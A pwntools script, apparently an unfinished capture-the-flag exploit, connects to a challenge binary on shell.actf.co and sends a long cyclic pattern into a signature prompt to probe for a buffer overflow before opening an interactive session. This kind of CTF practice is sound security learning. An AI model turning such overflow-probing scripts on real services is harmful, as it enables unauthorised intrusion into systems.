#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./source')
context.terminal = ['kitty', '-e', 'sh', '-c']

host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 21300)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --
padding = p64(0x1337) * 512

def init(option):
    io.sendlineafter("What would you like to do? ", str(option))

def t_c(payload1, payload2, payload3, attack):
    io.sendlineafter("Do you agree to the terms and conditions? ", payload1)
    if not attack:
        io.sendlineafter("Sign here: ", payload2)
        io.sendlineafter("Enter your name: ", payload3)
    
io = start()
init(1)
pause()
t_c('yes', 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaampaaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaamyaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaaniaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaanraaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaaobaaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaaokaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaaotaaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaapdaaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaapmaaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaapvaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaqfaaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaqoaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaqxaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaarhaaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaarqaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaarzaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaasjaaaaaaskaaaaaaslaaaaaasmaaaaaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaassaaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaatcaaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaatlaaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaatuaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaaueaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaaaumaaaaaaunaaaaaauoaaaaaaupaaaaaauqaaaaaauraaaaaausaaaaaautaaaaaauuaaaaaauvaaaaaauwaaaaaauxaaaaaauyaaaaaauzaaaaaavbaaaaaavcaaaaaavdaaaaaaveaaaaaavfaaaaaavgaaaaaavhaaaaaaviaaaaaavjaaaaaavkaaaaaavlaaaaaavmaaaaaavnaaaaaavoaaaaaavpaaaaaavqaaaaaavraaaaaavsaaaaaavtaaaaaavuaaaaaavvaaaaaavwaaaaaavxaaaaaavyaaaaaavzaaaaaawbaaaaaawcaaaaaawdaaaaaaweaaaaaawfaaaaaawgaaaaaawhaaaaaawiaaaaaawjaaaaaawkaaaaaawlaaaaaawmaaaaaawnaaaaaawoaaaaaawpaaaaaawqaaaaaawraaaaaawsaaaaaawtaaaaaawuaaaaaawvaaaaaawwaaaaaawxaaaaaawyaaaaaawzaaaaaaxbaaaaaaxcaaaaaaxdaaaaaaxeaaaaaaxfaaaaaaxgaaaaaaxhaaaaaaxiaaaaaaxjaaaaaaxkaaaaaaxlaaaaaaxmaaaaaaxnaaaaaaxoaaaaaaxpaaaaaaxqaaaaaaxraaaaaaxsaaaaaaxtaaaaaaxuaaaaaaxvaaaaaaxwaaaaaaxxaaaaaaxyaaaaaaxzaaaaaaybaaaaaaycaaaaaaydaaaaaayeaaaaaayfaaaaaaygaaaaaayhaaaaaayiaaaaaayjaaaaaaykaaaaaaylaaaaaaymaaaaaaynaaaaaayoaaaaaa', 'A'*8 , attack=False)
io.recvuntil("Skill level: ")
print(io.recvline())
io.interactive()

